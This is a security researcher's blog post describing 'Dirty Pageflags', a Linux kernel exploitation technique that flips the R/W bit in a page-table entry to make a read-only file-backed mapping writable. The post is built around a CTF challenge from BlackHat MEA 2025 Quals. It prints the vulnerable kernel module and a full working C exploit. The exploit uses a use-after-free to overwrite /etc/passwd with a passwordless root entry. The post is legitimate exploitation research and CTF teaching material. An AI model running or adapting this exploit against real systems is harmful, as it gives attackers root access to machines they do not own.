---
来源: https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2025年9月文章
---

この広告は、90日以上更新していないブログに表示しています。


**TL;DR**

By flipping the R/W bit in the page table entry of a mapped file (e.g., `/etc/passwd`), you can gain write [access](https://d.hatena.ne.jp/keyword/access) to the file.

* [What is Dirty Pagetable](#What-is-Dirty-Pagetable)
* [What is Dirty Pageflags](#What-is-Dirty-Pageflags)
* [Flipping R/W](#Flipping-RW)
* [PoC](#PoC)
* [Conclusion](#Conclusion)

# What is Dirty Pagetable

[Dirty Pagetable](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) is a powerful exploitation technique that targets heap vulnerabilities in the [Linux](https://d.hatena.ne.jp/keyword/Linux) kernel.

The core idea is to overlap a freed object with a page table entry (PTE).
By writing to the freed object, an attacker can directly manipulate the page table.
Since each PTE maps to a physical memory address, this provides extremely strong control over physical memory.
As a result, Dirty Pagetable can bypass critical security mechanisms such as KASLR, [SMAP](https://d.hatena.ne.jp/keyword/SMAP), and SMEP.

If you are unfamiliar with this technique, the [original article](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html) offers a detailed explanation of how the attack works.

# What is Dirty Pageflags

Although Dirty Pagetable is already a powerful technique, I wanted to explore a simpler and more versatile approach. My focus shifted to the flags within a page-table entry (PTE). In [x86-64](https://d.hatena.ne.jp/keyword/x86-64), the structure of a PTE looks like the following:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250912/20250912124501.png)

Fig 1. Structure of PTE in [x86-64](https://d.hatena.ne.jp/keyword/x86-64)

As you can see, it contains several flags such as XD, U/S, and R/W. Instead of overwriting the address field in the PTE, I decided to target these flags.

The following explains some important flags.

**P (Present)**

Indicates whether the page is currently present in physical memory.
If cleared (0), accessing the page triggers a page fault, and the OS may bring the page in from disk (demand paging).

**R/W (Read/Write)**

Controls whether the page is writable.
If set (1), both read and write operations are allowed.
If cleared (0), the page is read-only, and attempts to write to it will cause a protection fault.

**U/S (User/Supervisor)**

Defines the privilege level required to [access](https://d.hatena.ne.jp/keyword/access) the page.
If set (1), user-mode code (ring 3) can [access](https://d.hatena.ne.jp/keyword/access) the page.
If cleared (0), only supervisor mode (ring 0–2) can [access](https://d.hatena.ne.jp/keyword/access) it.

**D (Dirty)**

Set by the CPU when the page is written to.
This allows the OS to know whether the page needs to be written back to disk before being evicted.

**XD (Execute Disable)**

Also called NX (No-Execute).
If set (1), instruction fetches from the page are not allowed, preventing code execution.

Next, let’s examine which of these flags can make the exploit easier.

# Flipping R/W

Although some flags, such as U/S or XD, are related to security, modifying them is not as impactful as it might seem at first.
Because we can only control PTEs belonging to user space, flipping U/S simply removes [access](https://d.hatena.ne.jp/keyword/access) privileges and doesn't actually help exploitation.

While discussing which flags could be useful for privilege escalation with my colleague Dronex, he suggested targeting the **R/W** flag instead.

Consider a region of memory mapped as read-only.
If we flip the R/W flag in its PTE, the memory becomes writable.

On its own, this is not particularly useful. It's effectively the same as calling `mprotect` to change memory permissions.
However, the situation changes if the mapping is backed by a read-only file.

For example, suppose we open a file in read-only mode (e.g., `/etc/passwd`) and map it into memory at a certain address, as shown in Figure 2.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250914/20250914175603.png)

Fig 2. Before flipping R/W

If we then flip the R/W bit, the mapped page becomes writable, allowing us to overwrite its contents (Figure 3).
At this stage, the change is still local to memory and it hasn't been written back to the file yet.
However, the CPU automatically sets the **D (Dirty)** bit in the PTE to indicate that the page has been modified.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250914/20250914175615.png)

Fig 3. After flipping R/W and writing to the memory

Finally, when the memory is unmapped, the [Linux](https://d.hatena.ne.jp/keyword/Linux) kernel sees the D bit set and assumes the page must be written back to its backing file.
As a result, the supposedly read-only file is overwritten!

In some cases like use-after-free, however, we don't know which entry is modified.
Writing to an unmodified entry will result in SIGSEGV because it does not have R/W flag set.
To resolve this issue, we can use `read` syscall to write to the memory because `read` simply return -1 when it tried to write a read-only mapping, instead of crashing.

# PoC

I created a challenge based on Dirty Pageflags for BlackHat MEA 2025 Quals.

The goal of the challenge is to exploit a vulnerable [Linux](https://d.hatena.ne.jp/keyword/Linux) kernel module in order to gain root privileges.
The [vulnerability](https://d.hatena.ne.jp/keyword/vulnerability) is a straightforward use-after-free: you can increment a freed memory object twice.
(In fact, due to an unintended bug, it can actually be incremented infinitely.)

```
#define MAX_OBJ_NUM 0x100
#define PAD_SIZE    0x7f8

struct obj {
  char buf[PAD_SIZE];
  size_t cnt;
};

static struct kmem_cache *obj_cachep;
static DEFINE_MUTEX(module_lock);

unsigned char inc_used = 0;
struct obj *selected = 0;
struct obj *obj_array[MAX_OBJ_NUM] = { NULL };

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
  long ret = -EINVAL;
  mutex_lock(&module_lock);

  if (arg >= MAX_OBJ_NUM)
    goto out;

  switch (cmd) {
    case CMD_ALLOC:
      obj_array[arg] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
      ret = 0;
      break;

    case CMD_SEL:
      if (!obj_array[arg])
        goto out;
      selected = obj_array[arg];
      ret = 0;
      break;

    case CMD_INC:
      if (inc_used++ > 1)
        goto out;
      selected->cnt++;
      ret = 0;
      break;

    case CMD_DELETE:
      if (!obj_array[arg])
        goto out;
      kmem_cache_free(obj_cachep, obj_array[arg]);
      obj_array[arg] = NULL;
      ret = 0;
      break;
  }

 out:
  mutex_unlock(&module_lock);
  return ret;
}
```

Bugs that allow incrementing a freed memory region like this are not uncommon.
For instance, CVE-2022-28350 is an example where a use-after-free enables manipulation of a reference counter.

In Dirty Pagetable, the attacker increments the counter 0x1000 times to point to an adjacent physical page, effectively achieving a physical page-level use-after-free.
However, this method is both complex and not applicable under the constraints of this challenge.

With Dirty Pageflags, the situation changes significantly.
The attacker first sprays read-only memory regions backed by `/etc/passwd`, for instance.
By accessing at least part of this sprayed memory, the attacker ensures that the PGD and PMD are allocated in advance.

```
for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
  for (size_t j = 0; j < ENTRY_PER_TABLE; j++) {
    mmap_file_by_pti(etcfd, 1, i, j, DELTA / 8);
    mmap_file_by_pti(etcfd, 1, i, j, (0x800 + DELTA) / 8);
  }
  volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8); // Allocate PGD and PMD
}
```

Unlike Dirty Pagetable, here we are repeatedly mapping the same file.
As a result, only a single physical memory page is allocated for the file contents.
This means Dirty Pageflags consumes far less memory compared to Dirty Pagetable, which I think is another advantage.

Next, once the vulnerable object is freed and returned to the buddy allocator, the attacker sprays PTEs.
Since the PGD, PMD, and the actual file contents are already allocated, the freed object and the sprayed PTEs reliably overlap.

```
for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
  for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
    volatile char c;
    c = *PTI_TO_VIRT(1, i, j, DELTA / 8);
    c = *PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8);
  }
}
```

At this point, the lower two bits of the page-table entry are in the following state:

* P (Present): 1
* R/W (Read/Write): 0

After incrementing the freed object twice, the state becomes:

* P (Present): 1
* R/W (Read/Write): 1

It is important to note that the Present flag must remain set to 1.
If it is cleared, the [Linux](https://d.hatena.ne.jp/keyword/Linux) kernel will treat any [access](https://d.hatena.ne.jp/keyword/access) as a bug and crash.

With the PTE in this state, the attacker attempts writes across all sprayed addresses.
Eventually, one of them succeeds.

Finally, when the program exits and all file descriptors are closed, the modified file will have its Dirty flag set.
As a result, the [Linux](https://d.hatena.ne.jp/keyword/Linux) kernel writes the modified contents back to disk, effectively overwriting a file that was originally read-only.

```
#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CMD_ALLOC   0x0268
#define CMD_INC     0x0298
#define CMD_SEL     0x01c1
#define CMD_DELETE  0x0831

static void fatal(const char *s) {
  perror(s);
  exit(1);
}

void pin_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    fatal("sched_setaffinity");
}

int fd;

int module_alloc (size_t index) { return ioctl(fd, CMD_ALLOC , index); }
int module_inc() { return ioctl(fd, CMD_INC, 0); }
int module_sel(size_t index) { return ioctl(fd, CMD_SEL, index); }
int module_delete(size_t index) { return ioctl(fd, CMD_DELETE, index); }

#define MAX_OBJ_NUM 0x100
#define OBJ_SIZE    0x800

#define OBJS_PER_SLAB 8    // /sys/kernel/slab/obj/objs_per_slab
#define CPU_PARTIAL   24   // /sys/kernel/slab/obj/cpu_partial

char* PTI_TO_VIRT(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  assert (pgd < 0x200 && pud < 0x200 && pmd < 0x200 && pte < 0x200);
  return (void*)((pgd << 39) + (pud << 30) + (pmd << 21) + (pte << 12));
}

void* mmap_by_pti(size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, 0);
  assert (p == q);
  return p;
}

void* mmap_file_by_pti(int fd, size_t pgd, size_t pud, size_t pmd, size_t pte) {
  void *p = (void*)PTI_TO_VIRT(pgd, pud, pmd, pte);
  void *q = mmap(p, 0x1000, PROT_READ, MAP_SHARED|MAP_FIXED, fd, 0);
  assert (p == q);
  return p;
}

#define ENTRY_PER_TABLE 512
#define SPRAY_NUM 0x1800
#define DELTA 0x7f8

int main() {
  int etcfd = open("/etc/passwd", O_RDONLY);
  if (etcfd == -1) fatal("/etc/passwd");

  fd = open("/dev/vuln", O_RDWR);
  if (fd == -1) fatal("/dev/vuln");

  pin_cpu(0);

  puts("[+] Spraying objects...");
  for (size_t i = 0; i < MAX_OBJ_NUM; i++)
    if (module_alloc(i % MAX_OBJ_NUM) != 0)
      fatal("module_alloc");

  if (module_sel(50) != 0)
    fatal("module_sel");

  puts("[+] Preparing pages...");
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 0; j < ENTRY_PER_TABLE; j++) {
      mmap_file_by_pti(etcfd, 1, i, j, DELTA / 8);
      mmap_file_by_pti(etcfd, 1, i, j, (0x800 + DELTA) / 8);
    }
    volatile char c = *PTI_TO_VIRT(1, i, 0, DELTA / 8);
  }

  puts("[+] Returning page to buddy allocator");
  for (size_t i = 0; i < MAX_OBJ_NUM; i++)
    if (module_delete(i) != 0)
      fatal("module_delete");

  puts("[+] Spraying PTEs...");
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      volatile char c;
      c = *PTI_TO_VIRT(1, i, j, DELTA / 8);
      c = *PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8);
    }
  }

  puts("Go");
  if (module_inc() != 0)
    fatal("module_inc");
  if (module_inc() != 0)
    fatal("module_inc");

  // 101 --> 111
  int neko = open("/tmp/neko", O_RDWR | O_CREAT, 0666);
  write(neko, "root::0:0:root:/root:/bin/sh\n", 29);
  
  for (size_t i = 0; i < SPRAY_NUM / ENTRY_PER_TABLE; i++) {
    for (size_t j = 1; j < ENTRY_PER_TABLE; j++) {
      ssize_t s;
      lseek(neko, 0, SEEK_SET);
      s = read(neko, PTI_TO_VIRT(1, i, j, DELTA / 8), 29);
      if (s > 0) printf("wow: %ld, %ld\n", i, j);

      lseek(neko, 0, SEEK_SET);
      read(neko, PTI_TO_VIRT(1, i, j, (0x800 + DELTA) / 8), 29);
      if (s > 0) printf("wow: %ld, %ld (2)\n", i, j);
    }
  }

  puts("What's up?");
  return 0;
}
```

# Conclusion

In this article, we explored the Dirty Pageflags technique as an [alternative](https://d.hatena.ne.jp/keyword/alternative) to Dirty Pagetable.
By focusing on page table entry (PTE) flags, we demonstrated how flipping the R/W bit can be the [most](https://d.hatena.ne.jp/keyword/most) straightforward path to LPE.
This simplicity made it the preferred approach in our proof-of-concept.

That said, other PTE flags also present interesting opportunities for exploitation.
While we chose R/W for its direct impact, modifying different bits may enable novel attack vectors under different conditions.

It is also worth noting that the available flags vary across architectures.
For example, AArch64 and other platforms define different sets of PTE flags.
Investigating how similar attacks could be adapted to those architectures remains an open area for research.

Last but not least, thanks to Dronex for brainstorming exploitation ideas with me!


[« 
login-bonus (Daily AlpacaHack 2025/12/1…](https://ptr-yudai.hatenablog.com/entry/2025/12/18/151253)

[Midnight Flag CTF 2025 Writeups
 »](https://ptr-yudai.hatenablog.com/entry/2025/04/22/145743)